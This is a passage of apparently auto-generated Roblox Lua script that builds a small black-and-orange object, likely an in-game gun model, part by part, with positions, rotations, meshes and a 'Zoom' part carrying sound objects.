o174.CFrame = CFrame.new(-113.539955, 1.66896427, 63.7049255, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o174.FormFactor = Enum.FormFactor.Custom
o174.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o174.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o174.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o174.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o174.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o174.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o174.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o174.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o175 = Instance.new("BlockMesh")
o175.Parent = o174
o175.Scale = Vector3.new(0.0500000045, 0.166666672, 0.166666672)
o176 = Instance.new("Part")
o176.Parent = o1
o176.Material = Enum.Material.SmoothPlastic
o176.BrickColor = BrickColor.new("Really black")
o176.Position = Vector3.new(-113.556625, 1.56897795, 60.0083504)
o176.Rotation = Vector3.new(90.0000076, 5.29337331e-006, -180)
o176.Anchored = true
o176.CFrame = CFrame.new(-113.556625, 1.56897795, 60.0083504, -1, 1.50991141e-007, 9.23867916e-008, -9.2386756e-008, 1.93715223e-007, -1, -1.50991141e-007, -1, -1.93715223e-007)
o176.FormFactor = Enum.FormFactor.Custom
o176.Size = Vector3.new(0.200000003, 0.433333337, 0.200000003)
o176.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o176.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o176.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o176.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o176.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o176.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o176.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o177 = Instance.new("BlockMesh")
o177.Parent = o176
o177.Scale = Vector3.new(0.5, 1, 0.416666687)
o178 = Instance.new("Part")
o178.Parent = o1
o178.Material = Enum.Material.SmoothPlastic
o178.BrickColor = BrickColor.new("Really black")
o178.Position = Vector3.new(-113.539955, 1.37730074, 62.1583138)
o178.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o178.Anchored = true
o178.CFrame = CFrame.new(-113.539955, 1.37730074, 62.1583138, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o178.FormFactor = Enum.FormFactor.Custom
o178.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o178.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o178.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o178.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o178.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o178.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o178.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o178.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o179 = Instance.new("BlockMesh")
o179.Parent = o178
o179.Scale = Vector3.new(0.166666672, 0.5, 0.333333343)
o180 = Instance.new("Part")
o180.Parent = o1
o180.Material = Enum.Material.SmoothPlastic
o180.BrickColor = BrickColor.new("Neon orange")
o180.Position = Vector3.new(-113.539955, 1.32731259, 59.3583603)
o180.Rotation = Vector3.new(-89.9999924, -5.20639698e-010, 1.22437713e-010)
o180.Anchored = true
o180.CFrame = CFrame.new(-113.539955, 1.32731259, 59.3583603, 1, -2.13694123e-012, -9.08687708e-012, 9.08687708e-012, 2.53319939e-007, 1, -2.13693885e-012, -1, 2.53319968e-007)
o180.FormFactor = Enum.FormFactor.Custom
o180.Size = Vector3.new(0.200000003, 0.200000003, 0.233333334)
o180.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o180.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o180.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o180.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o180.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o180.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o180.Color = Color3.new(0.835294, 0.45098, 0.239216)
o181 = Instance.new("SpecialMesh")
o181.Parent = o180
o181.Scale = Vector3.new(0.916666687, 0.333333343, 1)
o181.MeshType = Enum.MeshType.Wedge
o182 = Instance.new("Part")
o182.Parent = o1
o182.Material = Enum.Material.SmoothPlastic
o182.BrickColor = BrickColor.new("Really black")
o182.Position = Vector3.new(-113.539955, 1.61062944, 63.7049179)
o182.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o182.Anchored = true
o182.CFrame = CFrame.new(-113.539955, 1.61062944, 63.7049179, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o182.FormFactor = Enum.FormFactor.Custom
o182.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o182.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o182.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o182.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o182.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o182.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o182.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o182.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o183 = Instance.new("BlockMesh")
o183.Parent = o182
o183.Scale = Vector3.new(0.333333343, 0.333333343, 0.416666687)
o184 = Instance.new("Part")
o184.Parent = o1
o184.Material = Enum.Material.SmoothPlastic
o184.BrickColor = BrickColor.new("Really black")
o184.Position = Vector3.new(-113.539955, 0.896721542, 59.4836807)
o184.Rotation = Vector3.new(-73.9999924, -4.66918282e-010, 2.61258543e-010)
o184.Anchored = true
o184.CFrame = CFrame.new(-113.539955, 0.896721542, 59.4836807, 1, -4.5598217e-012, -8.14926165e-012, 9.0904298e-012, 0.275637537, 0.96126169, -2.13693885e-012, -0.96126169, 0.275637507)
o184.FormFactor = Enum.FormFactor.Custom
o184.Size = Vector3.new(0.200000003, 0.216666669, 0.449999988)
o184.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o184.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o184.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o184.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o184.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o184.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o184.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o185 = Instance.new("BlockMesh")
o185.Parent = o184
o185.Scale = Vector3.new(0.916666687, 1, 1)
o186 = Instance.new("Part")
o186.Parent = o1
o186.Material = Enum.Material.SmoothPlastic
o186.BrickColor = BrickColor.new("Really black")
o186.Position = Vector3.new(-113.539955, 0.956089139, 59.6394043)
o186.Rotation = Vector3.new(-73.9999924, -5.12302313e-006, -180)
o186.Anchored = true
o186.CFrame = CFrame.new(-113.539955, 0.956089139, 59.6394043, -1, 8.74258674e-008, -8.94136178e-008, -1.10047722e-007, -0.275637537, 0.96126169, 5.93933862e-008, 0.96126169, 0.275637507)
o186.FormFactor = Enum.FormFactor.Custom
o186.Size = Vector3.new(0.200000003, 0.200000003, 0.316666663)
o186.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o186.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o186.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o186.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o186.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o186.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o186.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o187 = Instance.new("SpecialMesh")
o187.Parent = o186
o187.Scale = Vector3.new(0.916666687, 0.25, 1)
o187.MeshType = Enum.MeshType.Wedge
o188 = Instance.new("Part")
o188.Parent = o1
o188.Material = Enum.Material.SmoothPlastic
o188.BrickColor = BrickColor.new("Really black")
o188.Position = Vector3.new(-113.539955, 1.46064496, 59.3583641)
o188.Rotation = Vector3.new(90.0000153, 5.00939313e-006, 180)
o188.Anchored = true
o188.CFrame = CFrame.new(-113.539955, 1.46064496, 59.3583641, -1, -2.13552136e-012, 8.74304007e-008, -8.74304007e-008, 2.68221214e-007, -1, 2.11207028e-012, -1, -2.68221214e-007)
o188.FormFactor = Enum.FormFactor.Custom
o188.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o188.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o188.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o188.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o188.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o188.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o188.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o188.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o189 = Instance.new("SpecialMesh")
o189.Parent = o188
o189.Scale = Vector3.new(0.916666687, 0.333333343, 0.166666672)
o189.MeshType = Enum.MeshType.Wedge
o190 = Instance.new("Part")
o190.Parent = o1
o190.Material = Enum.Material.SmoothPlastic
o190.BrickColor = BrickColor.new("Neon orange")
o190.Position = Vector3.new(-113.5373, 1.31434989, 58.6492157)
o190.Rotation = Vector3.new(2.50447852e-006, 2.50457879e-006, 4.2913037e-010)
o190.Anchored = true
o190.CFrame = CFrame.new(-113.5373, 1.31434989, 58.6492157, 1, -7.489738e-012, 4.37131469e-008, 8.24089842e-012, 0.999991596, -4.37110295e-008, -4.3712955e-008, 4.37110295e-008, 0.999991596)
o190.CanCollide = false
o190.FormFactor = Enum.FormFactor.Symmetric
o190.Size = Vector3.new(1, 1, 1)
o190.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o190.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o190.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o190.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o190.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o190.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o190.Color = Color3.new(0.835294, 0.45098, 0.239216)
o191 = Instance.new("BlockMesh")
o191.Parent = o190
o191.Scale = Vector3.new(0.192307696, 0.0384615399, 1.42307687)
o192 = Instance.new("Part")
o192.Parent = o1
o192.Material = Enum.Material.SmoothPlastic
o192.BrickColor = BrickColor.new("Really black")
o192.Position = Vector3.new(-113.539955, 1.40230477, 60.75)
o192.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o192.Anchored = true
o192.CFrame = CFrame.new(-113.539955, 1.40230477, 60.75, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o192.FormFactor = Enum.FormFactor.Custom
o192.Size = Vector3.new(0.200000003, 0.200000003, 0.25)
o192.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o192.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o192.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o192.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o192.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o192.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o192.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o193 = Instance.new("BlockMesh")
o193.Parent = o192
o193.Scale = Vector3.new(0.916666687, 0.75, 1)
o194 = Instance.new("Part")
o194.Parent = o1
o194.Material = Enum.Material.SmoothPlastic
o194.BrickColor = BrickColor.new("Neon orange")
o194.Position = Vector3.new(-113.5373, 1.10281682, 57.8800049)
o194.Rotation = Vector3.new(-2.50447738e-006, 2.50457879e-006, -180)
o194.Anchored = true
o194.CFrame = CFrame.new(-113.5373, 1.10281682, 57.8800049, -1, 7.49355959e-012, 4.37131469e-008, -8.24089842e-012, -0.999991596, 4.37110117e-008, 4.3712955e-008, 4.37110117e-008, 0.999991596)
o194.CanCollide = false
o194.FormFactor = Enum.FormFactor.Symmetric
o194.Size = Vector3.new(1, 1, 1)
o194.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o194.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o194.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o194.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o194.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o194.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o194.Color = Color3.new(0.835294, 0.45098, 0.239216)
o195 = Instance.new("SpecialMesh")
o195.Parent = o194
o195.Scale = Vector3.new(0.192307696, 0.461538464, 0.115384616)
o195.MeshType = Enum.MeshType.Wedge
o196 = Instance.new("Part")
o196.Parent = o1
o196.Material = Enum.Material.SmoothPlastic
o196.BrickColor = BrickColor.new("Really black")
o196.Position = Vector3.new(-113.509956, 1.64896476, 63.7049255)
o196.Rotation = Vector3.new(-90, 24.9996357, -2.59040348e-007)
o196.Anchored = true
o196.CFrame = CFrame.new(-113.509956, 1.64896476, 63.7049255, 0.906310558, 4.09752721e-009, 0.422612488, -0.422612458, 1.3219902e-007, 0.906310558, -5.21553183e-008, -1, 1.21545028e-007)
o196.FormFactor = Enum.FormFactor.Custom
o196.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o196.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o196.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o196.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o196.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o196.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o196.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o196.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o197 = Instance.new("BlockMesh")
o197.Parent = o196
o197.Scale = Vector3.new(0.0416666679, 0.333333343, 0.166666672)
o198 = Instance.new("Part")
o198.Parent = o1
o198.Material = Enum.Material.SmoothPlastic
o198.BrickColor = BrickColor.new("Really black")
o198.Position = Vector3.new(-113.539955, 1.37730229, 60.0333443)
o198.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o198.Anchored = true
o198.CFrame = CFrame.new(-113.539955, 1.37730229, 60.0333443, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o198.FormFactor = Enum.FormFactor.Custom
o198.Size = Vector3.new(0.200000003, 1.2833333, 0.200000003)
o198.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o198.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o198.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o198.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o198.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o198.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o198.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o199 = Instance.new("BlockMesh")
o199.Parent = o198
o199.Scale = Vector3.new(0.916666687, 1, 1)
o200 = Instance.new("Part")
o200.Parent = o1
o200.Material = Enum.Material.SmoothPlastic
o200.BrickColor = BrickColor.new("Really black")
o200.Position = Vector3.new(-113.539955, 1.05897915, 60.0933495)
o200.Rotation = Vector3.new(-87.9999847, -5.91998833e-006, 180)
o200.Anchored = true
o200.CFrame = CFrame.new(-113.539955, 1.05897915, 60.0933495, -1, -1.50990829e-007, -1.03323288e-007, -9.79908066e-008, -0.0348997675, 0.999390841, -1.54504804e-007, 0.999390841, 0.0348997675)
o200.FormFactor = Enum.FormFactor.Custom
o200.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o200.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o200.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o200.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o200.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o200.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o200.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o200.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o201 = Instance.new("BlockMesh")
o201.Parent = o200
o201.Scale = Vector3.new(0.666666687, 0.166666672, 0.416666687)
o202 = Instance.new("Part")
o202.Parent = o1
o202.Material = Enum.Material.SmoothPlastic
o202.BrickColor = BrickColor.new("Really black")
o202.Position = Vector3.new(-113.589958, 1.67825508, 60.750042)
o202.Rotation = Vector3.new(-87.9999847, -2.80858876e-006, 90)
o202.Anchored = true
o202.CFrame = CFrame.new(-113.589958, 1.67825508, 60.750042, -4.37141736e-008, -1, -4.90191212e-008, 0.0348996781, -5.0514867e-008, 0.999390841, -0.999390841, 4.197679e-008, 0.0348996781)
o202.FormFactor = Enum.FormFactor.Custom
o202.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o202.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o202.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o202.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o202.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o202.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o202.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o202.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o203 = Instance.new("CylinderMesh")
o203.Parent = o202
o203.Scale = Vector3.new(0.25, 0.333333343, 0.25)
o204 = Instance.new("Part")
o204.Parent = o1
o204.Material = Enum.Material.SmoothPlastic
o204.BrickColor = BrickColor.new("Neon orange")
o204.Position = Vector3.new(-113.539955, 1.54396534, 61.3583183)
o204.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o204.Anchored = true
o204.CFrame = CFrame.new(-113.539955, 1.54396534, 61.3583183, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o204.FormFactor = Enum.FormFactor.Custom
o204.Size = Vector3.new(0.200000003, 0.566666663, 0.200000003)
o204.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o204.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o204.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o204.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o204.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o204.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o204.Color = Color3.new(0.835294, 0.45098, 0.239216)
o205 = Instance.new("BlockMesh")
o205.Parent = o204
o205.Scale = Vector3.new(0.916666687, 1, 0.333333343)
o206 = Instance.new("Part")
o206.Parent = o1
o206.Material = Enum.Material.SmoothPlastic
o206.BrickColor = BrickColor.new("Neon orange")
o206.Position = Vector3.new(-113.564957, 1.57731104, 61.3583183)
o206.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o206.Anchored = true
o206.CFrame = CFrame.new(-113.564957, 1.57731104, 61.3583183, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o206.FormFactor = Enum.FormFactor.Custom
o206.Size = Vector3.new(0.200000003, 0.566666663, 0.200000003)
o206.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o206.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o206.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o206.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o206.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o206.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o206.Color = Color3.new(0.835294, 0.45098, 0.239216)
o207 = Instance.new("CylinderMesh")
o207.Parent = o206
o207.Scale = Vector3.new(0.666666687, 1, 0.666666687)
o208 = Instance.new("Part")
o208.Parent = o1
o208.Material = Enum.Material.SmoothPlastic
o208.BrickColor = BrickColor.new("Neon orange")
o208.Position = Vector3.new(-113.539955, 1.54396534, 61.0416641)
o208.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o208.Anchored = true
o208.CFrame = CFrame.new(-113.539955, 1.54396534, 61.0416641, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o208.FormFactor = Enum.FormFactor.Custom
o208.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o208.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o208.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o208.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o208.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o208.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o208.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o208.Color = Color3.new(0.835294, 0.45098, 0.239216)
o209 = Instance.new("BlockMesh")
o209.Parent = o208
o209.Scale = Vector3.new(0.916666687, 0.333333343, 0.333333343)
o210 = Instance.new("Part")
o210.Parent = o1
o210.Material = Enum.Material.SmoothPlastic
o210.BrickColor = BrickColor.new("Really black")
o210.Position = Vector3.new(-113.514954, 1.57731104, 61.0416603)
o210.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o210.Anchored = true
o210.CFrame = CFrame.new(-113.514954, 1.57731104, 61.0416603, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o210.FormFactor = Enum.FormFactor.Custom
o210.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o210.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o210.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o210.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o210.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o210.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o210.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o210.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o211 = Instance.new("CylinderMesh")
o211.Parent = o210
o211.Scale = Vector3.new(0.666666687, 0.333333343, 0.666666687)
o212 = Instance.new("Part")
o212.Parent = o1
o212.Material = Enum.Material.SmoothPlastic
o212.BrickColor = BrickColor.new("Neon orange")
o212.Position = Vector3.new(-113.539955, 1.61895657, 61.6666527)
o212.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o212.Anchored = true
o212.CFrame = CFrame.new(-113.539955, 1.61895657, 61.6666527, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o212.FormFactor = Enum.FormFactor.Custom
o212.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o212.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o212.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o212.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o212.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o212.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o212.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o212.Color = Color3.new(0.835294, 0.45098, 0.239216)
o213 = Instance.new("BlockMesh")
o213.Parent = o212
o213.Scale = Vector3.new(0.25, 0.25, 0.25)
o214 = Instance.new("Part")
o214.Parent = o1
o214.Material = Enum.Material.SmoothPlastic
o214.BrickColor = BrickColor.new("Really black")
o214.Position = Vector3.new(-113.639954, 1.3777262, 59.9190521)
o214.Rotation = Vector3.new(-79.9999847, -4.91393648e-010, 90)
o214.Anchored = true
o214.CFrame = CFrame.new(-113.639954, 1.3777262, 59.9190521, 7.54961107e-008, -1, -8.5764373e-012, 0.173648521, 1.31013387e-008, 0.984807789, -0.984807789, -7.43506305e-008, 0.173648506)
o214.FormFactor = Enum.FormFactor.Custom
o214.Size = Vector3.new(0.449999988, 0.200000003, 0.200000003)
o214.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o214.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o214.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o214.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o214.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o214.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o214.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o215 = Instance.new("BlockMesh")
o215.Parent = o214
o215.Scale = Vector3.new(1, 0.0833333358, 0.333333343)
o216 = Instance.new("Part")
o216.Parent = o1
o216.Material = Enum.Material.SmoothPlastic
o216.BrickColor = BrickColor.new("Really black")
o216.Position = Vector3.new(-113.539955, 1.61063278, 63.6465836)
o216.Rotation = Vector3.new(90.0000076, 5.00937449e-006, 180)
o216.Anchored = true
o216.CFrame = CFrame.new(-113.539955, 1.61063278, 63.6465836, -1, -8.74234445e-008, 8.7430081e-008, -8.74300881e-008, 1.93715223e-007, -1, 8.74234232e-008, -1, -1.93715252e-007)
o216.FormFactor = Enum.FormFactor.Custom
o216.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o216.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o216.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o216.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o216.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o216.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o216.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o216.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o217 = Instance.new("SpecialMesh")
o217.Parent = o216
o217.Scale = Vector3.new(0.333333343, 0.25, 0.416666687)
o217.MeshType = Enum.MeshType.Wedge
o218 = Instance.new("Part")
o218.Parent = o1
o218.Material = Enum.Material.SmoothPlastic
o218.BrickColor = BrickColor.new("Really black")
o218.Position = Vector3.new(-113.539955, 1.49396372, 62.1833)
o218.Rotation = Vector3.new(90.0000076, -5.00833175e-006, -1.2209328e-010)
o218.Anchored = true
o218.CFrame = CFrame.new(-113.539955, 1.49396372, 62.1833, 1, 2.13092976e-012, -8.74118768e-008, -8.74118768e-008, -1.04308192e-007, -1, -2.14004747e-012, 1, -1.04308192e-007)
o218.FormFactor = Enum.FormFactor.Custom
o218.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o218.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o218.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o218.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o218.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o218.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o218.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o218.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o219 = Instance.new("SpecialMesh")
o219.Parent = o218
o219.Scale = Vector3.new(0.333333343, 0.583333313, 0.666666687)
o219.MeshType = Enum.MeshType.Wedge
o220 = Instance.new("Part")
o220.Parent = o1
o220.Material = Enum.Material.SmoothPlastic
o220.BrickColor = BrickColor.new("Really black")
o220.Position = Vector3.new(-113.48996, 1.54398501, 60.233345)
o220.Rotation = Vector3.new(90.0000153, 5.00939313e-006, 180)
o220.Anchored = true
o220.CFrame = CFrame.new(-113.48996, 1.54398501, 60.233345, -1, -2.13552136e-012, 8.74304007e-008, -8.74304007e-008, 2.68221214e-007, -1, 2.11207028e-012, -1, -2.68221214e-007)
o220.FormFactor = Enum.FormFactor.Custom
o220.Size = Vector3.new(0.200000003, 0.883333325, 0.200000003)
o220.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o220.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o220.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o220.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o220.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o220.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o220.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o221 = Instance.new("BlockMesh")
o221.Parent = o220
o221.Scale = Vector3.new(0.166666672, 1, 0.666666687)
o222 = Instance.new("Part")
o222.Name = "Zoom"
o222.Parent = o1
o222.Material = Enum.Material.SmoothPlastic
o222.BrickColor = BrickColor.new("Really black")
o222.Transparency = 1
o222.Position = Vector3.new(-113.539955, 1.72229445, 59.8150215)
o222.Rotation = Vector3.new(-179.999985, 1.15806685e-007, 180)
o222.Anchored = true
o222.CFrame = CFrame.new(-113.539955, 1.72229445, 59.8150215, -1, -1.51002368e-007, 2.02120787e-009, -1.51002368e-007, 1, 3.27825802e-007, -2.02125738e-009, 3.27825802e-007, -1)
o222.FormFactor = Enum.FormFactor.Custom
o222.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o222.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o222.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o222.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o222.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o222.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o222.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o222.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o223 = Instance.new("BlockMesh")
o223.Parent = o222
o223.Scale = Vector3.new(0.166666672, 0.75, 0.166666672)
o224 = Instance.new("Sound")
o224.Name = "Empty"
o224.Parent = o222
o224.SoundId = "rbxasset://sounds//clickfast.wav"
o224.Volume = 1
o225 = Instance.new("Sound")
o225.Name = "M1"
